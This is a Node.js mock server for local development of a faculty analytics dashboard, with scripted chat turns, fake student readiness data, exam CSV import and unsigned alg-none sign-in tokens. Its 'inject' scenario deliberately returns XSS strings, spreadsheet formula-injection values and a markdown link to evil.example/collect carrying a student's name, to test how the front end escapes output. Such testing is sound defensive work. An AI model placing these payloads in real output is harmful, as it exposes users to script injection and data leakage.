#!/usr/bin/env node
/**
 * Faculty Ask without any backend: a local stand-in for agent-v2's faculty
 * routes (real SSE, resume and cancel), plus an empty IAM and Tests so the
 * dashboard never calls a deployed service. All data here is made up.
 *
 *   pnpm run dev:ask-mock
 *
 * That starts this server and the Vite dev server pointed at it, and prints a
 * line to paste in the browser console to sign in as a mock account. Words in
 * a question pick what happens:
 *
 *   hardest   a bar chart and a table      inject    hostile cell values
 *   trend     a line chart                 limit     429 daily limit
 *   growth    an area chart                forbidden 403 faculty gate
 *   share     a pie chart                  fail      the turn fails
 *   count     a single number              slow      a long answer, to try Stop
 *   unknown   a snapshot with no as-of
 *
 * Anything else gets the "needs attention" answer.
 *
 * On a cohort page, Import exam results reads the CSV you choose. The mock knows
 * sara@example.com, omar@example.com, layla@example.com and nour@example.com,
 * and any other email is a row error. A word in the file's name picks a refusal:
 *
 *   forbidden 403    gone 404    toolarge 413    broken 400    boom 500
 */
import { spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { randomUUID } from 'node:crypto';

const PORT = 8799;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ---------------------------------------------------------------------------
// Results
// ---------------------------------------------------------------------------

const attentionTable = (queryId) => ({
  queryId,
  purpose: 'Checking readiness snapshot',
  explanation:
    'Readiness multiplies mastery, coverage and pacing, so low coverage alone can bring it down. Needs attention means readiness under 40%. This lists each student at cohort level, lowest first, from the latest snapshot.',
  sql: `SELECT l.learner_id, l.name, r.readiness, r.mastery, r.coverage, r.pacing,
       r.items_answered, r.needs_attention
FROM faculty.student_readiness r
JOIN faculty.learners l USING (learner_id, cohort_id)
WHERE r.course_id IS NULL
ORDER BY r.readiness
LIMIT 500;`,
  columns: [
    { name: 'learner_id', dataType: 'text' },
    { name: 'name', dataType: 'text' },
    { name: 'readiness', dataType: 'numeric' },
    { name: 'mastery', dataType: 'numeric' },
    { name: 'coverage', dataType: 'numeric' },
    { name: 'pacing', dataType: 'numeric' },
    { name: 'items_answered', dataType: 'int4' },
    { name: 'needs_attention', dataType: 'bool' },
  ],
  rows: [
    ['/users/mock-1', 'Sara Haddad', '0.22', '0.48', '0.35', '0.66', 41, true],
    ['/users/mock-2', 'Omar Nabil', '0.31', '0.62', '0.41', '0.81', 67, true],
    ['/users/mock-3', 'Layla Mansour', '0.38', '0.71', '0.52', '0.74', 88, true],
    ['/users/mock-4', 'Youssef Adel', '0.56', '0.68', '0.77', '0.91', 120, false],
    ['/users/mock-5', 'نور الدين سالم', '0.74', '0.83', '0.88', '1.02', 164, false],
    ['/users/mock-6', 'Mariam Fathy', null, null, '0.05', null, 3, false],
  ].map(([learner_id, name, readiness, mastery, coverage, pacing, items_answered, needs_attention]) => ({
    learner_id,
    name,
    readiness,
    mastery,
    coverage,
    pacing,
    items_answered,
    needs_attention,
  })),
  rowCount: 6,
  truncated: false,
  durationMs: 84,
  asOf: [{ kind: 'readiness', computedAt: '2026-10-29T18:00:00Z' }],
  asOfUnknown: false,
});

const topicsTable = (queryId) => ({
  queryId,
  purpose: 'Ranking topics by percent correct',
  explanation:
    'Percent correct is the share of latest answers per student and item that were right, with auto-filled answers left out. This ranks each topic, hardest first, and marks those with under 30 answers.',
  sql: `SELECT key AS topic, n_items, n_responses, pct_correct, insufficient_data
FROM faculty.topic_difficulty
WHERE level = 'topic'
ORDER BY pct_correct
LIMIT 500;`,
  columns: [
    { name: 'topic', dataType: 'text' },
    { name: 'n_items', dataType: 'int4' },
    { name: 'n_responses', dataType: 'int4' },
    { name: 'pct_correct', dataType: 'numeric' },
    { name: 'insufficient_data', dataType: 'bool' },
  ],
  rows: [
    { topic: 'Renal tubular acidosis', n_items: 14, n_responses: 212, pct_correct: 41.2, insufficient_data: false },
    { topic: 'Glomerular disease', n_items: 22, n_responses: 340, pct_correct: 48.9, insufficient_data: false },
    { topic: 'Acid-base balance', n_items: 9, n_responses: 96, pct_correct: 55.1, insufficient_data: false },
    { topic: 'Cardiac cycle', n_items: 18, n_responses: 275, pct_correct: 63.4, insufficient_data: false },
    { topic: 'Hepatobiliary pathology', n_items: 3, n_responses: 12, pct_correct: 66.7, insufficient_data: true },
  ],
  rowCount: 5,
  truncated: true,
  durationMs: 41,
  asOf: [{ kind: 'item_stats', computedAt: '2026-10-29T02:00:00Z' }],
  asOfUnknown: false,
});

const hostileTable = (queryId) => ({
  queryId,
  purpose: '<img src=x onerror=alert(1)>',
  explanation: '<b>Not bold.</b> <script>alert(1)</script>',
  sql: "SELECT '<script>alert(1)</script>' AS name",
  columns: [
    { name: 'name', dataType: 'text' },
    { name: 'note', dataType: 'text' },
    { name: '=HYPERLINK("http://evil.example")', dataType: 'text' },
  ],
  rows: [
    { name: '<script>alert(1)</script>', note: '=HYPERLINK("http://evil.example","click")', '=HYPERLINK("http://evil.example")': '@SUM(1,1)' },
    { name: '<img src=x onerror=alert(1)>', note: '+1+1', '=HYPERLINK("http://evil.example")': '-2+3' },
  ],
  rowCount: 2,
  truncated: false,
  durationMs: 7,
  asOf: [],
  asOfUnknown: false,
});

const topicsChart = (queryId, rows) => ({
  chartId: `chart-${queryId}`,
  queryId,
  type: 'bar',
  x: 'topic',
  y: ['pct_correct'],
  takeaway: 'Renal topics are the hardest this term',
  rows: rows.map(({ topic, pct_correct }) => ({ topic, pct_correct })),
});

// ---------------------------------------------------------------------------
// Scripted turns
// ---------------------------------------------------------------------------

const ATTENTION_ANSWER = `**Three of the six students in Year 2 need attention** before the renal exam.

- **Sara Haddad** (readiness 22%): coverage is the biggest driver, at 35% against a cohort median of 64%.
- **Omar Nabil** (31%): mastery is near the median, but coverage is 41%.
- **Layla Mansour** (38%): mastery is strong, and pacing is the main gap.

These are students to look at, not a prediction. Mariam Fathy has answered only 3 questions, so there is too little to say.`;

const TOPICS_ANSWER = `Students found **renal topics** hardest this term. Renal tubular acidosis sits at 41% correct across 212 answers.

| Topic | % correct |
|---|---|
| Renal tubular acidosis | 41 |
| Glomerular disease | 49 |

Hepatobiliary pathology has too few answers to rely on.`;

const weeklyTable = (queryId) => ({
  ...topicsTable(queryId),
  purpose: 'Counting answers per week',
  explanation: 'Counts every answer and every student who answered, for each week, oldest first.',
  sql: 'SELECT date_trunc(\'week\', answered_at) AS week, count(*) AS answers, count(DISTINCT learner_id) AS learners\nFROM faculty.answers\nGROUP BY 1\nORDER BY 1;',
  columns: [
    { name: 'week', dataType: 'timestamptz' },
    { name: 'answers', dataType: 'int8' },
    { name: 'learners', dataType: 'int8' },
  ],
  rows: [
    ['2026-09-07', 1210, 91],
    ['2026-09-14', 1480, 104],
    ['2026-09-21', 1395, 99],
    ['2026-09-28', 1720, 118],
    ['2026-10-05', 1650, 112],
    ['2026-10-12', 1905, 127],
    ['2026-10-19', 2110, 133],
  ].map(([week, answers, learners]) => ({ week: `${week}T00:00:00Z`, answers, learners })),
  rowCount: 7,
  truncated: false,
  asOf: [],
  asOfUnknown: false,
});

const sharesTable = (queryId) => ({
  ...topicsTable(queryId),
  purpose: 'Sharing answers out by organ system',
  explanation: 'Counts answers per organ system, largest first.',
  sql: 'SELECT organ_system, count(*) AS answers FROM faculty.answers GROUP BY 1 ORDER BY 2 DESC;',
  columns: [
    { name: 'organ_system', dataType: 'text' },
    { name: 'answers', dataType: 'int8' },
  ],
  rows: [
    { organ_system: 'Renal', answers: 5400 },
    { organ_system: 'Cardiovascular', answers: 4200 },
    { organ_system: 'Respiratory', answers: 2300 },
    { organ_system: 'Hepatobiliary', answers: 900 },
    { organ_system: 'Endocrine', answers: 600 },
    { organ_system: 'Reproductive', answers: 300 },
  ],
  rowCount: 6,
  truncated: false,
  asOf: [],
  asOfUnknown: false,
});

const countTable = (queryId) => ({
  ...topicsTable(queryId),
  purpose: 'Counting active learners',
  explanation: 'Active means at least one answer in the last 7 days.',
  sql: 'SELECT count(*) FILTER (WHERE answers_7d > 0) AS active_learners, count(*) AS all_learners FROM faculty.learner_activity;',
  columns: [
    { name: 'active_learners', dataType: 'int8' },
    { name: 'all_learners', dataType: 'int8' },
  ],
  rows: [{ active_learners: 133, all_learners: 1842 }],
  rowCount: 1,
  truncated: false,
  asOf: [],
  asOfUnknown: false,
});

const charted = (table, type, x, y, takeaway) => ({
  steps: ['runFacultyQuery', 'showChart'],
  table,
  chart: { chartId: `chart-${table.queryId}`, queryId: table.queryId, type, x, y, takeaway, rows: table.rows },
  answer: `${takeaway}.`,
});

const scriptFor = (question) => {
  const q = question.toLowerCase();
  const queryId = `q-${randomUUID().slice(0, 8)}`;
  if (q.includes('fail')) return { steps: ['describeFacultyViews'], failure: true };
  if (q.includes('trend')) return charted(weeklyTable(queryId), 'line', 'week', ['answers', 'learners'], 'Practice is rising week on week');
  if (q.includes('growth')) return charted(weeklyTable(queryId), 'area', 'week', ['answers'], 'Answers almost doubled since September');
  if (q.includes('share')) return charted(sharesTable(queryId), 'pie', 'organ_system', ['answers'], 'Renal and cardiovascular take most of the practice');
  if (q.includes('count')) return charted(countTable(queryId), 'kpi', 'active_learners', ['active_learners', 'all_learners'], '133 learners were active this week');
  if (q.includes('unknown')) {
    return {
      steps: ['runFacultyQuery'],
      table: { ...attentionTable(queryId), asOf: [], asOfUnknown: true },
      answer: 'Three students need attention, but the date of this snapshot could not be read.',
    };
  }
  if (q.includes('inject')) {
    return { steps: ['runFacultyQuery'], table: hostileTable(queryId), answer: 'The values below are shown as text. **<b>This is not bold HTML.</b>** See [your report](https://evil.example/collect?data=Sara).' };
  }
  if (q.includes('hardest')) {
    const table = topicsTable(queryId);
    return { steps: ['loadSkill', 'runFacultyQuery', 'showChart'], table, chart: topicsChart(queryId, table.rows), answer: TOPICS_ANSWER };
  }
  return {
    steps: ['loadSkill', 'describeFacultyViews', 'runFacultyQuery'],
    table: attentionTable(queryId),
    answer: ATTENTION_ANSWER,
    delayMs: q.includes('slow') ? 400 : 60,
  };
};

const eventsFor = (operationId, threadId, script) => {
  const events = [{ type: 'turn.started', threadId }];
  const messageId = `m-${operationId}`;
  events.push({ type: 'message.started', messageId });
  script.steps.forEach((toolName, index) => {
    const toolCallId = `call-${String(index)}`;
    events.push({ type: 'tool.started', messageId, toolCallId, toolName });
    if (toolName === 'runFacultyQuery' && script.table) events.push({ type: 'faculty.table', ...script.table });
    if (toolName === 'showChart' && script.chart) {
      const { type, ...chart } = script.chart;
      events.push({ type: 'faculty.chart', chartType: type, ...chart });
    }
    events.push({ type: 'tool.settled', toolCallId, ok: true });
  });
  if (script.failure) {
    events.push({ type: 'turn.failed', error: { code: 'internal', message: 'The model call failed.', retryable: true } });
    return events;
  }
  for (const part of script.answer.match(/\S+\s*/g) ?? []) events.push({ type: 'text.delta', messageId, text: part });
  events.push({ type: 'message.completed', messageId, reason: 'complete' });
  events.push({ type: 'turn.completed', reason: 'completed' });
  return events;
};

// ---------------------------------------------------------------------------
// State: two threads to reopen, and the turns asked since start
// ---------------------------------------------------------------------------

const threads = new Map();
const turns = new Map();

const seedThread = (threadId, title, hoursAgo, table, chart, answer) => {
  const at = new Date(Date.now() - hoursAgo * 3_600_000).toISOString();
  const operationId = randomUUID();
  threads.set(threadId, {
    threadId,
    title,
    turnCount: 1,
    createdAt: at,
    lastTurnAt: at,
    lastReplyAt: at,
    activeOperationId: null,
    activeTurnStatus: null,
    unread: false,
    pinned: false,
    mode: null,
    messages: [
      { messageId: `${threadId}-u`, role: 'user', content: title, operationId, stepIndex: null, ordinal: 0, finishReason: null, toolCalls: null, toolCallId: null, anchorMessageId: null, createdAt: at },
      {
        messageId: `${threadId}-a`,
        role: 'assistant',
        content: answer,
        operationId,
        stepIndex: 0,
        ordinal: 1,
        finishReason: 'complete',
        toolCalls: null,
        toolCallId: null,
        anchorMessageId: null,
        createdAt: at,
        facultyResults: { tables: [table], charts: chart ? [chart] : [] },
      },
    ],
  });
};

const topics = topicsTable('q-seed-topics');
seedThread('thread-topics', 'Which topics did Year 2 find hardest this term?', 3, topics, topicsChart('q-seed-topics', topics.rows), TOPICS_ANSWER);
seedThread('thread-attention', 'Who needs attention before the renal exam, and why?', 30, attentionTable('q-seed-attention'), null, ATTENTION_ANSWER);

const COHORTS = [
  {
    id: 'http://localhost:8799/cohorts/year-2-2026',
    identifier: 'year-2-2026',
    title: 'Year 2, 2026',
    status: 'active',
    learners: [],
    courses: [],
  },
];

// ---------------------------------------------------------------------------
// Exam results import
// ---------------------------------------------------------------------------

const EXAM_LEARNERS = new Map([
  ['sara@example.com', { id: '/users/mock-1', name: 'Sara Haddad' }],
  ['omar@example.com', { id: '/users/mock-2', name: 'Omar Nabil' }],
  ['layla@example.com', { id: '/users/mock-3', name: 'Layla Mansour' }],
  ['nour@example.com', { id: '/users/mock-5', name: 'نور الدين سالم' }],
]);

const EXAM_COLUMNS = ['email', 'exam_name', 'exam_date', 'score', 'passed'];

const EXAM_REFUSALS = [
  ['forbidden', 403, 'tenant admin or owner role required'],
  ['gone', 404, 'cohort not found'],
  ['toolarge', 413, 'the file has more than 20000 rows'],
  ['broken', 400, 'the header is missing exam_date'],
  ['boom', 500, 'the results could not be saved, nothing was saved'],
];

const EXAM_PASSED = new Map([
  ['true', true], ['pass', true], ['yes', true], ['1', true],
  ['false', false], ['fail', false], ['no', false], ['0', false],
]);

const examRowProblems = ({ email, examName, examDate, score, maxScore, passed }) =>
  [
    !EXAM_LEARNERS.has(email) && 'this email is not a learner in this cohort',
    !examName && 'exam_name is required',
    !/^\d{4}-\d{2}-\d{2}$/.test(examDate) && 'exam_date must be a date written YYYY-MM-DD',
    !(score >= 0) && 'score must be a number, 0 or more',
    maxScore !== null && score > maxScore && 'score is above max_score',
    !EXAM_PASSED.has(passed) && 'passed must be true/false, pass/fail, yes/no or 1/0',
  ].filter(Boolean);

const examRow = (cells, header, line) => {
  const cell = (name) => (cells[header.indexOf(name)] ?? '').trim();
  const fields = {
    email: cell('email').toLowerCase(),
    examName: cell('exam_name'),
    examDate: cell('exam_date'),
    score: Number(cell('score') || NaN),
    maxScore: cell('max_score') ? Number(cell('max_score')) : null,
    passed: cell('passed').toLowerCase(),
  };
  const learner = EXAM_LEARNERS.get(fields.email);
  const problems = examRowProblems(fields);
  return {
    ...fields,
    line,
    learnerId: learner?.id ?? '',
    learnerName: learner?.name ?? '',
    score: Number.isFinite(fields.score) ? fields.score : 0,
    passed: EXAM_PASSED.get(fields.passed) ?? false,
    error: problems.length > 0 ? problems.join('; ') : null,
  };
};

const handleExamImport = async (req, res, url) => {
  const { csv = '', source = '' } = await readBody(req);
  await sleep(500);
  const refusal = EXAM_REFUSALS.find(([word]) => source.toLowerCase().includes(word));
  if (refusal) return json(res, refusal[1], { error: refusal[2] });

  const lines = csv.split(/\r?\n/).map((text, index) => ({ text, line: index + 1 })).filter(({ text }) => text.trim());
  const header = (lines[0]?.text ?? '').split(',').map((name) => name.trim().toLowerCase());
  const missing = EXAM_COLUMNS.find((name) => !header.includes(name));
  if (missing) return json(res, 400, { error: `the header is missing ${missing}` });

  if (lines.length === 1) return json(res, 400, { error: 'the file has no data rows' });

  const rows = lines.slice(1).map(({ text, line }) => examRow(text.split(','), header, line));
  const valid = rows.filter((row) => !row.error).length;
  const dryRun = url.searchParams.get('dryRun') !== 'false';
  const failed = !dryRun && valid < rows.length;
  return json(res, failed ? 422 : 200, {
    dryRun,
    total: rows.length,
    valid,
    saved: dryRun || failed ? 0 : rows.length,
    rows,
  });
};

// ---------------------------------------------------------------------------
// HTTP
// ---------------------------------------------------------------------------

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Authorization, Content-Type, Last-Event-ID',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
};

const json = (res, status, body) => {
  res.writeHead(status, { ...CORS, 'Content-Type': 'application/json' });
  res.end(JSON.stringify(body));
};

const refuse = (res, status, code, message) => json(res, status, { error: { code, message } });

const readBody = async (req) => {
  let text = '';
  for await (const chunk of req) text += chunk;
  return text ? JSON.parse(text) : {};
};

const publicThread = ({ messages: _messages, ...thread }) => thread;

const handleCreateTurn = async (req, res) => {
  const body = await readBody(req);
  const question = String(body.message ?? '');
  const lowered = question.toLowerCase();
  if (lowered.includes('limit')) return refuse(res, 429, 'faculty_daily_limit_reached', 'Daily limit reached.');
  if (lowered.includes('forbidden')) return refuse(res, 403, 'faculty_forbidden', 'Not allowed.');
  if (body.facultyContext) console.log('facultyContext', JSON.stringify(body.facultyContext));

  const operationId = body.operationId ?? randomUUID();
  const threadId = body.threadId ?? `thread-${randomUUID().slice(0, 8)}`;
  const now = new Date().toISOString();
  const thread = threads.get(threadId) ?? {
    threadId,
    title: question.slice(0, 120),
    turnCount: 0,
    createdAt: now,
    lastTurnAt: now,
    lastReplyAt: null,
    activeOperationId: null,
    activeTurnStatus: null,
    unread: false,
    pinned: false,
    mode: null,
    messages: [],
  };
  thread.turnCount += 1;
  thread.lastTurnAt = now;
  thread.activeOperationId = operationId;
  thread.activeTurnStatus = 'running';
  thread.messages.push({ messageId: `${operationId}-u`, role: 'user', content: question, operationId, stepIndex: null, ordinal: thread.messages.length, finishReason: null, toolCalls: null, toolCallId: null, anchorMessageId: null, createdAt: now });
  threads.set(threadId, thread);

  const script = scriptFor(question);
  turns.set(operationId, { operationId, thread, script, events: eventsFor(operationId, threadId, script), cancelled: false });
  return json(res, 202, {
    operationId,
    threadId,
    created: true,
    stream: `/v1/turns/${operationId}/stream`,
    cancel: `/v1/turns/${operationId}/cancel`,
    approvals: `/v1/turns/${operationId}/approvals`,
  });
};

const finishThread = (turn) => {
  const { thread, script, operationId } = turn;
  thread.activeOperationId = null;
  thread.activeTurnStatus = null;
  thread.lastReplyAt = new Date().toISOString();
  thread.messages.push({
    messageId: `${operationId}-a`,
    role: 'assistant',
    content: turn.cancelled ? '' : (script.answer ?? ''),
    operationId,
    stepIndex: 0,
    ordinal: thread.messages.length,
    finishReason: turn.cancelled ? 'interrupted' : 'complete',
    toolCalls: null,
    toolCallId: null,
    anchorMessageId: null,
    createdAt: thread.lastReplyAt,
    facultyResults: { tables: script.table ? [script.table] : [], charts: script.chart ? [script.chart] : [] },
  });
};

const handleStream = async (req, res, operationId) => {
  const turn = turns.get(operationId);
  if (!turn) return refuse(res, 404, 'turn_not_found', 'No such turn.');

  res.writeHead(200, { ...CORS, 'Content-Type': 'text/event-stream; charset=utf-8', 'Cache-Control': 'no-store' });
  res.write(': stream open\n\n');

  let closed = false;
  req.on('close', () => {
    closed = true;
  });

  const cursor = Number(req.headers['last-event-id'] ?? -1);
  const write = (seq, event) => {
    const frame = { ...event, seq, operationId, at: new Date().toISOString() };
    res.write(`id: ${String(seq)}\nevent: ${event.type}\ndata: ${JSON.stringify(frame)}\n\n`);
  };

  for (let seq = cursor + 1; seq < turn.events.length; seq += 1) {
    if (closed) return undefined;
    if (turn.cancelled) {
      const messageId = `m-${operationId}`;
      write(seq, { type: 'message.completed', messageId, reason: 'interrupted' });
      write(seq + 1, { type: 'turn.completed', reason: 'cancelled' });
      break;
    }
    const event = turn.events[seq];
    write(seq, event);
    if (event.type === 'turn.completed' || event.type === 'turn.failed') break;
    const isStep = event.type.startsWith('tool.') || event.type.startsWith('faculty.');
    await sleep(isStep ? 500 : (turn.script.delayMs ?? 60));
  }
  if (!turn.finished) {
    turn.finished = true;
    finishThread(turn);
  }
  return res.end();
};

const server = createServer(async (req, res) => {
  const url = new URL(req.url, `http://localhost:${String(PORT)}`);
  const path = url.pathname;
  if (req.method === 'OPTIONS') {
    res.writeHead(204, CORS);
    return res.end();
  }

  if (path === '/v1/threads' && req.method === 'GET') {
    const listed = [...threads.values()].sort((a, b) => b.lastTurnAt.localeCompare(a.lastTurnAt)).map(publicThread);
    return json(res, 200, { threads: listed, nextCursor: null, watchCursor: 'mock' });
  }
  const messages = /^\/v1\/threads\/([^/]+)\/messages$/.exec(path);
  if (messages && req.method === 'GET') {
    const thread = threads.get(decodeURIComponent(messages[1]));
    if (!thread) return refuse(res, 404, 'thread_not_found', 'No such thread.');
    return json(res, 200, { threadId: thread.threadId, messages: thread.messages });
  }
  if (path === '/v1/turns' && req.method === 'POST') return handleCreateTurn(req, res);

  const stream = /^\/v1\/turns\/([^/]+)\/stream$/.exec(path);
  if (stream && req.method === 'GET') return handleStream(req, res, stream[1]);

  const cancel = /^\/v1\/turns\/([^/]+)\/cancel$/.exec(path);
  if (cancel && req.method === 'POST') {
    const turn = turns.get(cancel[1]);
    if (!turn) return refuse(res, 404, 'turn_not_found', 'No such turn.');
    turn.cancelled = true;
    return json(res, 200, { operationId: turn.operationId, cancelled: true, status: 'running', completionReason: null });
  }
  if (path === '/v1/faculty/feedback' && req.method === 'POST') {
    console.log('feedback', JSON.stringify(await readBody(req)));
    return json(res, 200, { ok: true });
  }

  const examImport = /^\/cohorts\/[^/]+\/exam-results\/import$/.exec(path);
  if (examImport && req.method === 'POST') return handleExamImport(req, res, url);

  // The dashboard's other services, just enough for the pages around Ask.
  if (path === '/cohorts') return json(res, 200, { items: COHORTS, total: COHORTS.length });
  if (path.includes('/metrics')) return json(res, 404, { message: 'The mock has no metrics.' });
  return json(res, 200, { items: [], total: 0 });
});

// ---------------------------------------------------------------------------
// Start
// ---------------------------------------------------------------------------

const base64url = (value) => Buffer.from(JSON.stringify(value)).toString('base64url');

/** Unsigned, and only a mock's: the dashboard reads the claims, and this server checks nothing. */
const mockToken = (claims) => `${base64url({ alg: 'none' })}.${base64url(claims)}.mock`;

const signInLine = (label, claims) =>
  `  ${label}:\n    localStorage.setItem('msai_educator_token', '${mockToken(claims)}'); location.href = '/ask';`;

const ROLES = 'https://iam.weos.io/v1/roles';
const TENANT_ROLE = 'https://iam.weos.io/v1/tenant_role';
const EMAIL = 'https://iam.weos.io/v1/email';

server.listen(PORT, '127.0.0.1', () => {
  const base = `http://localhost:${String(PORT)}`;
  const vite = spawn('pnpm', ['exec', 'vite', '--port', '5173', '--strictPort', '--mode', 'dashboard'], {
    stdio: 'inherit',
    env: {
      ...process.env,
      VITE_IAM_API_URL: base,
      VITE_TUTOR_API_URL: base,
      VITE_TEST_API_URL: base,
      VITE_NOTIFICATIONS_API_URL: base,
      VITE_AGENT_V2_API_URL: base,
    },
  });
  vite.on('exit', (code) => process.exit(code ?? 0));

  console.log(`\nMock Ask backend on ${base}. Open http://localhost:5173/login and paste one of these in the console:\n`);
  console.log(signInLine('tenant admin (sees Ask)', { [ROLES]: ['Administrator'], [TENANT_ROLE]: 'admin', [EMAIL]: 'dean@example.test' }));
  console.log(signInLine('superadmin who is also a tenant owner (sees Ask)', { [ROLES]: ['superadmin'], [TENANT_ROLE]: 'owner', [EMAIL]: 'both@example.test' }));
  console.log(signInLine('superadmin only (no Ask)', { [ROLES]: ['superadmin'], [EMAIL]: 'platform@example.test' }));
  console.log();
});
